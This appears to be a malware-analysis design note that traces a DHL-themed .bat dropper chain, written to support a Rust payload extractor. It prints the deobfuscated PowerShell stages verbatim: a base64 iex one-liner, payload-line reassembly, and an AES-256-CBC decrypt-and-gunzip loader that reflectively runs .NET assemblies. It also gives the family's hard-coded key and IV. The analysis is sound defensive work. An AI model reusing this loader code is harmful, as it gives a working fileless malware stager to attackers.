# AES-CBC Dropper Chain — End-to-end trace

Traced from `DHL_Delivery_Form_(03.10.2025)_PDF.bat` on 2026-05-19.

## Stage 1 — in the deob text

The deob contains a long PS one-liner of the shape:

```
powershell.exe -nop -w h -c "iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(('<HUGE_B64_WITH_MARKERS>'.Replace('nclsmghzth','')))))"
```

- `<HUGE_B64_WITH_MARKERS>` is ~7000 chars of base64 with literal `nclsmghzth` interleaved as padding.
- After `.Replace('nclsmghzth','')`, the cleaned base64 length is ~4944 chars.
- Decoded bytes: ~3708 bytes UTF-16LE PowerShell.

## Stage 2 — UTF-16LE PS body produced by stage 1

```ps
$banana="$env:USERPROFILE\aoc.bat";
if(Test-Path $banana){
  $rawLines=gc $banana|?{$_ -like ":::*"};
  $part1=($rawLines|?{$_ -like ":::1*"}|%{$_.Substring(4)});
  $part2=($rawLines|?{$_ -like ":::2*"}|%{$_.Substring(4)});
  $part3=($rawLines|?{$_ -like ":::3*"}|%{$_.Substring(4)});
  $part4=($rawLines|?{$_ -like ":::4*"}|%{$_.Substring(4)});
  $part5=($rawLines|?{$_ -like ":::5*"}|%{$_.Substring(4)});
  $kiwi=$part1+$part2+$part3+$part4+$part5;
  $apple=($kiwi -replace "limestrawberry","" -replace "ugiwuhkkfiquilr","");
  if($apple){
    try{iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($apple)))}catch{}
  }
};
$orange='H4sIAAAAAAAA...';   # ~1012-char gzipped b64 — gzip magic visible in b64 form
$mango=[Convert]::FromBase64String($orange);
$pineapple=New-Object IO.MemoryStream(,$mango);
iex(New-Object IO.StreamReader(
  New-Object IO.Compression.GZipStream($pineapple,[IO.Compression.CompressionMode]::Decompress)
).ReadToEnd())
```

Key observations:
- `$banana` is `%USERPROFILE%\aoc.bat` — a copy made by the `.bat` itself earlier. The `:::N*` lines are in the **original .bat we're analyzing**; we don't need to follow the copy.
- The marker list is two strings: `limestrawberry` and `ugiwuhkkfiquilr`.
- The inline `$orange='H4sIA...'` is gzipped base64; `iex(...GZipStream...)` gunzips and executes it.

## Stage 3 — gunzipped from stage 2's `$orange`

```ps
$gfwii = $env:USERNAME;
$vuoid = "C:\Users\$gfwii\aoc.bat";

function bcch($param_var){
    $aes_var=[System.Security.Cryptography.Aes]::Create();
    $aes_var.Mode=[System.Security.Cryptography.CipherMode]::CBC;
    $aes_var.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;
    $aes_var.Key=[System.Convert]::FromBase64String('YxDv4kASEFyuJeQu75vQBrsFn/XUfuPBjWy3/xKoBl8=');
    $aes_var.IV=[System.Convert]::FromBase64String('PcWh4S5zqexZ2ueefstJ6A==');
    $decryptor_var=$aes_var.CreateDecryptor();
    $return_var=$decryptor_var.TransformFinalBlock($param_var, 0, $param_var.Length);
    $decryptor_var.Dispose();
    $aes_var.Dispose();
    $return_var;
}

function kkxqb($param_var){    # gunzip
    $hnjuz=New-Object System.IO.MemoryStream(,$param_var);
    $mucco=New-Object System.IO.MemoryStream;
    $xvass=New-Object System.IO.Compression.GZipStream($hnjuz, [IO.Compression.CompressionMode]::Decompress);
    $xvass.CopyTo($mucco);
    $xvass.Dispose();
    $hnjuz.Dispose();
    $mucco.Dispose();
    $mucco.ToArray();
}

function mpuo($param_var,$param2_var){
    $dcdri=[System.Reflection.Assembly]::Load([byte[]]$param_var);
    $rblfu=$dcdri.EntryPoint;
    $rblfu.Invoke($null, $param2_var);
}

$host.UI.RawUI.WindowTitle = $vuoid;
$wvffi=[System.IO.File]::ReadAllText($vuoid).Split([Environment]::NewLine);
foreach ($wtnbz in $wvffi) {
    if ($wtnbz.StartsWith(':: '))    {
        $wggow=$wtnbz.Substring(3);
        break;
    }
}
$frha=[string[]]$wggow.Split('\');
$hqedd=kkxqb (bcch ([Convert]::FromBase64String($frha[0])));
$lenc =kkxqb (bcch ([Convert]::FromBase64String($frha[1])));
mpuo $hqedd $null;
mpuo $lenc (,[string[]] ('%*'));
```

Key facts (extracted by `ps_extract.rs`):
- **AES key** (base64): `YxDv4kASEFyuJeQu75vQBrsFn/XUfuPBjWy3/xKoBl8=` → 32 bytes → AES-256
- **AES IV** (base64): `PcWh4S5zqexZ2ueefstJ6A==` → 16 bytes
- **Mode**: CBC, PKCS7 padding
- **Source line prefix**: `:: ` (colon-colon-space, 3 chars). First matching line wins.
- **Split delimiter**: backslash (`\`).
- **Decrypt flow**: for each half — b64-decode → AES-CBC decrypt → gunzip → byte array. First half is decoy/staging (`$hqedd`), second is the real `$lenc` (reflection-loaded with `'%*'` as args).

## Stage 4 — decrypted+decompressed bytes

Both halves are `[byte[]]` payloads passed to `System.Reflection.Assembly::Load`. They are .NET PE assemblies — DLLs or EXEs in `MZ`-prefixed PE format. URLs are present as UTF-8 or UTF-16LE string literals in the `#US` (user strings) stream or in `.text`/`.rsrc` sections.

We do not need to parse the PE; a byte-level URL regex scan against the decompressed blob is sufficient.

## Observed variants (across the 5 reference samples in Plan S Task 7)

| Sample | Marker count | Payload prefix | Halves | AES size |
|--------|--------------|----------------|--------|----------|
| `DHL_Delivery_Form...PDF.bat` | 2 (`limestrawberry`, `ugiwuhkkfiquilr`) | `:: ` | 2 | 256 |
| `factura_53030.bat` | 2 | `:: ` | 2 | 256 |
| `OrbitalProtocol.bat` | (re-check) | (re-check) | (re-check) | (re-check) |
| `Payment_Advice_pdf.bat` | (re-check) | (re-check) | (re-check) | (re-check) |
| `wMecANa.bat` | (re-check) | (re-check) | (re-check) | (re-check) |

The implementer should run `payload_lines::collect()` and `ps_extract::find_aes_key_iv()` against each reference sample to populate the variants table before writing `extract_from_chain`.

## Test fixtures

Captured stage-1 b64 (truncated), stage-3 PS, and reference Key/IV for unit tests of crypto.rs:

- Key (b64): `YxDv4kASEFyuJeQu75vQBrsFn/XUfuPBjWy3/xKoBl8=`
- IV (b64): `PcWh4S5zqexZ2ueefstJ6A==`

These are NOT secrets — they're the malware's plaintext keys, hard-coded into every infected sample of this family.
